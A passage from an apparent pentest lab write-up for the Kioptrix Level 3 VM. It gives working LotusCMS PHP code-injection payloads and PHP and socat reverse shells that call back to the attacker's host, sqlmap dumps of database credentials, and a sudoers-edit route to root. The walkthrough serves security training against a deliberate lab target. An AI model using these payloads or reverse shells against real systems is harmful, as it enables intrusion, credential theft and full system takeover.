<p>In fact you can extend the above to upload arbitrary files. (Note that this is much less stealthy than exploiting kioptrix3’s ability to upload gallery files.) To demonstrate this we’ll take a side excursion to upload a version of a php reverse shell that includes a pty following <a class="reference external" href="http://pentestmonkey.net/blog/ssh-with-no-tty">Using SSH Without A TTY - Other potential solutions</a>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
<span class="c1"># Download pentestmonkey reverse php shell</span>
<span class="nv">REVSH</span><span class="o">=</span><span class="s2">&quot;php-reverse-shell.php&quot;</span>
curl --silent --remote-name http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
tar -xvzf php-reverse-shell-1.0.tar.gz
cp php-reverse-shell-1.0/<span class="nv">$REVSH</span> .
<span class="c1"># Change to our ip/port</span>
sed -i <span class="s2">&quot;s/127.0.0.1/</span><span class="nv">$KALI</span><span class="s2">/&quot;</span> <span class="nv">$REVSH</span>
sed -i <span class="s2">&quot;s/1234/</span><span class="nv">$PORT</span><span class="s2">/&quot;</span> <span class="nv">$REVSH</span>
<span class="c1"># change 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;)  to  0 =&gt; array(&quot;pty&quot;)</span>
sed -i <span class="s1">&#39;s/\([012]\) =&gt; array(&quot;pipe&quot;, &quot;[rw]&quot;)/\1 =&gt; array(&quot;pty&quot;)/&#39;</span> <span class="nv">$REVSH</span>
<span class="c1"># prepare to upload the reverse shell</span>
socat -u FILE:<span class="nv">$REVSH</span> TCP-LISTEN:<span class="nv">$PORT</span>
</pre></div>
</div>
<p>Then pull the file into a writeable directory on the web server (<code class="file docutils literal notranslate"><span class="pre">/home/www/kioptrix3.com/gallery/photos/</span></code> will work):</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;passthru(&quot;cd /home/www/kioptrix3.com/gallery/photos/; nc &#39;</span><span class="s2">&quot;</span><span class="nv">$KALI</span><span class="s2"> </span><span class="nv">$PORT</span><span class="s2">&quot;</span><span class="s1">&#39; &gt; /home/www/kioptrix3.com/gallery/photos/php-reverse-shell.php; chmod +x php-reverse-shell.php;&quot;);&#39;</span>
<span class="nv">CMD64</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$CMD</span><span class="s2">&quot;</span> <span class="p">|</span> base64 -w <span class="m">0</span><span class="k">)</span>
<span class="nb">echo</span> -n <span class="nv">$CMD64</span> <span class="p">|</span> base64 -d
<span class="c1"># PAGE=index&#39;);eval(base64_decode(...));#</span>
<span class="nv">PAGE</span><span class="o">=</span><span class="s2">&quot;index&#39;&quot;</span><span class="s1">&#39;);eval(base64_decode(&quot;&#39;</span><span class="nv">$CMD64</span><span class="s1">&#39;&quot;));#&#39;</span>
curl -v http://kioptrix3.com/index.php <span class="se">\</span>
  --data-urlencode <span class="nv">page</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAGE</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>At this point you can pop a reverse shell with a pty by first starting a Kali listener:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="c1"># get LINES, COLUMNS available so can set later</span>
<span class="nb">echo</span> <span class="nv">$LINES</span>,<span class="nv">$COLUMNS</span>
<span class="c1"># try &quot;cfmakeraw&quot; or &quot;rawer&quot; if available vs. &quot;raw,echo=0&quot;</span>
socat -,raw,echo<span class="o">=</span><span class="m">0</span> TCP-LISTEN:<span class="nv">$PORT</span>
<span class="c1"># do this first in new session</span>
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>linux
<span class="nb">echo</span> <span class="nv">$LINES</span>,<span class="nv">$COLUMNS</span>
<span class="c1"># to change LINES and COLUMNS (set to valid values)</span>
<span class="nb">export</span> <span class="nv">LINES</span><span class="o">=</span><span class="m">24</span><span class="p">;</span><span class="nb">export</span> <span class="nv">COLUMNS</span><span class="o">=</span><span class="m">80</span>
</pre></div>
</div>
<p>Then open the reverse shell we just uploaded:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl -v http://kioptrix3.com/gallery/photos/php-reverse-shell.php
</pre></div>
</div>
</div>
<div class="section" id="executing-arbitrary-php-even-better-socat-based-reverse-shell">
<h5>3.12.3.2.3.3. Executing arbitrary PHP - even better socat-based reverse shell<a class="headerlink" href="#executing-arbitrary-php-even-better-socat-based-reverse-shell" title="Permalink to this headline">¶</a></h5>
<p>The above reverse shell is better but still lacking tab completion, … . You can get that if you have <strong class="program">socat</strong> on both ends. But how to get <strong class="program">socat</strong> on the target machine? The source is available at <a class="reference external" href="http://www.dest-unreach.org/socat/">dest-unreach / socat</a>. Find the latest download link then on the target host:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> /tmp
<span class="c1"># use curl or wget</span>
<span class="c1">#   later socat versions did not build</span>
wget  http://www.dest-unreach.org/socat/download/socat-1.7.3.0.tar.gz <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
tar -xvzf socat-1.7.3.0.tar.gz
<span class="nb">cd</span> socat-*
./configure <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
make <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
cp socat /home/www/kioptrix3.com/data/
</pre></div>
</div>
<p>Then start the listener on Kali via:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="c1"># get LINES, COLUMNS available so can set later</span>
<span class="nb">echo</span> <span class="nv">$LINES</span>,<span class="nv">$COLUMNS</span>
<span class="c1"># try &quot;cfmakeraw&quot; or &quot;rawer&quot; if available vs. &quot;raw,echo=0&quot;</span>
socat -,raw,echo<span class="o">=</span><span class="m">0</span> TCP-LISTEN:<span class="nv">$PORT</span>
<span class="c1"># do this first in new session</span>
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>linux
<span class="nb">echo</span> <span class="nv">$LINES</span>,<span class="nv">$COLUMNS</span>
<span class="c1"># to change LINES and COLUMNS</span>
<span class="c1"># export LINES=NN;export COLUMNS=MM</span>
</pre></div>
</div>
<p>Then from the target machines PHP invoke socat using the command <code class="docutils literal notranslate"><span class="pre">socat</span> <span class="pre">TCP-CONNECT:$KALI:$PORT</span> <span class="pre">EXEC:&quot;/bin/bash</span> <span class="pre">-li&quot;,pty,stderr,setsid,sigint,sane</span></code>. You’ll have tab completion, can use <strong class="program">vi</strong>, … . You’ll need to set TERM in order to run <strong class="program">/usr/local/bin/ht</strong>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="nv">SOCAT</span><span class="o">=</span><span class="s2">&quot;/home/www/kioptrix3.com/data/socat&quot;</span>
<span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;passthru(&quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$SOCAT</span><span class="s2">&quot;</span><span class="s1">&#39; TCP-CONNECT:&#39;</span><span class="s2">&quot;</span><span class="nv">$KALI</span><span class="s2">:</span><span class="nv">$PORT</span><span class="s2">&quot;</span><span class="s1">&#39; EXEC:&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;/bin/bash -li&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;,pty,stderr,setsid,sigint,sane&quot;);&#39;</span>
<span class="nv">CMD64</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$CMD</span><span class="s2">&quot;</span> <span class="p">|</span> base64 -w <span class="m">0</span><span class="k">)</span>
<span class="nv">PAGE</span><span class="o">=</span><span class="s2">&quot;index&#39;&quot;</span><span class="s1">&#39;);eval(base64_decode(&quot;&#39;</span><span class="nv">$CMD64</span><span class="s1">&#39;&quot;));#&#39;</span>
curl -v http://kioptrix3.com/index.php <span class="se">\</span>
  --data-urlencode <span class="nv">page</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PAGE</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>So LotusCMS allows us to easily download/upload files, execute arbitrary PHP scripts, and pop php reverse shells with a pty which can execute <strong class="program">/usr/local/bin/ht</strong>. Note that since the file upload uses <strong class="program">nc</strong> on a non-standard port it’s inferior to using the kioptrix3 built-in gallery file upload.</p>
</div>
</div>
</div>
</div>
<div class="section" id="the-exploit">
<h2>3.12.4. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
<div class="section" id="exploiting-the-gallarific-sql-injection">
<h3>3.12.4.1. Exploiting the Gallarific SQL injection<a class="headerlink" href="#exploiting-the-gallarific-sql-injection" title="Permalink to this headline">¶</a></h3>
<p>The actual <code class="file docutils literal notranslate"><span class="pre">gallery.php</span></code> page is found at <a class="reference external" href="http://kioptrix3.com/gallery/gallery.php">http://kioptrix3.com/gallery/gallery.php</a>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix3
<span class="nb">source</span> <span class="nv">$PT</span>/kioptrix3_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
rm -rf sqlmap
<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://kioptrix3.com/gallery/gallery.php?id=null&#39;</span>
sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlpmap <span class="se">\</span>
  --dbms<span class="o">=</span>MySQL --banner --current-user --is-dba --current-db --users --passwords --dbs
</pre></div>
</div>
<p>Here’s the important results from this SQL injection:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span>
<span class="go">web application technology: PHP 5.2.4, Apache 2.2.8</span>
<span class="go">banner:    &#39;5.0.51a-3ubuntu5.4&#39;</span>
<span class="go">current user:    &#39;root@localhost&#39;</span>
<span class="go">current database:    &#39;gallery&#39;</span>
<span class="go">current user is DBA:    True</span>
<span class="go">[*] debian-sys-maint [1]:</span>
<span class="go">    password hash: *F46D660C8ED1B312A40E366A86D958C6F1EF2AB8</span>
<span class="go">[*] root [1]:</span>
<span class="go">    password hash: *47FB3B1E573D80F44CD198DC65DE7764795F948E</span>
<span class="go">available databases [3]:</span>
<span class="go">[*] gallery</span>
<span class="go">[*] information_schema</span>
<span class="go">[*] mysql</span>
</pre></div>
</div>
<p>So we’ll just see what tables are in gallery:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlpmap <span class="se">\</span>
  --dbms<span class="o">=</span>MySQL -D gallery --tables
</pre></div>
</div>
<p>And this returns:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: gallery</span>
<span class="go">[7 tables]</span>
<span class="go">+----------------------+</span>
<span class="go">| dev_accounts         |</span>
<span class="go">| gallarific_comments  |</span>
<span class="go">| gallarific_galleries |</span>
<span class="go">| gallarific_photos    |</span>
<span class="go">| gallarific_settings  |</span>
<span class="go">| gallarific_stats     |</span>
<span class="go">| gallarific_users     |</span>
<span class="go">+----------------------+</span>
</pre></div>
</div>
<p>So we’ll go after table dev_accounts first:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlpmap <span class="se">\</span>
  --dbms<span class="o">=</span>MySQL -D gallery -T deb_accounts --dump
</pre></div>
</div>
<p>And this returns:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: gallery</span>
<span class="go">Table: dev_accounts</span>
<span class="go">[2 entries]</span>
<span class="go">+----+------------+---------------------------------------------+</span>
<span class="go">| id | username   | password                                    |</span>
<span class="go">+----+------------+---------------------------------------------+</span>
<span class="go">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span>
<span class="go">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span>
<span class="go">+----+------------+---------------------------------------------+</span>
</pre></div>
</div>
<p>And then table gallarific_users:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlpmap <span class="se">\</span>
  --dbms<span class="o">=</span>MySQL -D gallery -T deb_accounts --dump
</pre></div>
</div>
<p>And this returns:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: gallery</span>
<span class="go">Table: gallarific_users</span>
<span class="go">[1 entry]</span>
<span class="go">+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+</span>
<span class="go">| userid | photo   | email   | website | username | lastname | joincode | usertype  | password | firstname | datejoined | issuperuser |</span>
<span class="go">+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+</span>
<span class="go">| 1      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; | admin    | User     | &lt;blank&gt;  | superuser | n0t7t1k4 | Super     | 1302628616 | 1           |</span>
<span class="go">+--------+---------+---------+---------+----------+----------+----------+-----------+----------+-----------+------------+-------------+</span>
</pre></div>
</div>
</div>
<div class="section" id="shell-access-to-root">
<h3>3.12.4.2. Shell access to root<a class="headerlink" href="#shell-access-to-root" title="Permalink to this headline">¶</a></h3>
<p>Try <strong class="program">ssh</strong> with the passwords and loneferret/starwars gets you in. Trying <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">-l</span></code> shows you can run the hex editor <strong class="program">/usr/local/bin/ht</strong>. <a class="reference external" href="https://github.com/sebastianbiallas/ht">sebastianbiallas/ht</a> is an editor that happens to be suid root on this machine allowing us to edit system files like <code class="file docutils literal notranslate"><span class="pre">/etc/sudoers</span></code>. (Note - I disabled keyboard shortcuts on my Kali terminal so I could use them in the <strong class="program">ht</strong> editor.) Here we get root:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix3/exploit$</span> ssh loneferret@kioptrix3.com
</span><span class="go">loneferret@kioptrix3.com&#39;s password:</span>
<span class="go">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="gp">loneferret@Kioptrix3:/tmp$</span> sudo -l
</span><span class="hll"><span class="go">User loneferret may run the following commands on this host:</span>
</span><span class="hll"><span class="go">    (root) NOPASSWD: !/usr/bin/su</span>
</span><span class="hll"><span class="go">    (root) NOPASSWD: /usr/local/bin/ht</span>
</span><span class="gp">loneferret@Kioptrix3:~$</span> ls -l /usr/local/bin/ht
<span class="go">-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht</span>
<span class="gp">loneferret@Kioptrix3:/tmp$ #</span> edit sudoers file giving loneferret root access
<span class="gp">loneferret@Kioptrix3:/tmp$</span> /usr/local/bin/ht /etc/sudoers
<span class="hll"><span class="gp">loneferret@Kioptrix3:/tmp$</span> sudo -l
</span><span class="hll"><span class="go">User loneferret may run the following commands on this host:</span>
</span><span class="hll"><span class="go">    (root) NOPASSWD: /bin/su</span>
</span><span class="hll"><span class="go">    (root) NOPASSWD: /usr/local/bin/ht</span>
</span><span class="hll"><span class="gp">loneferret@Kioptrix3:/tmp$</span> sudo su -
</span><span class="hll"><span class="gp">root@Kioptrix3:~#</span> id
</span><span class="hll"><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</span></pre></div>
</div>
<p>And so we have root.</p>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="kioptrix2.html" class="btn btn-neutral float-right" title="3.13. Kioptrix Level 2" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="kioptrix4.html" class="btn btn-neutral" title="3.11. Kioptrix Level 4" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  <script type="text/javascript">
      jQuery(function () {
          
          SphinxRtdTheme.Navigation.enableSticky();
          
      });
  </script> 

</body>
</html>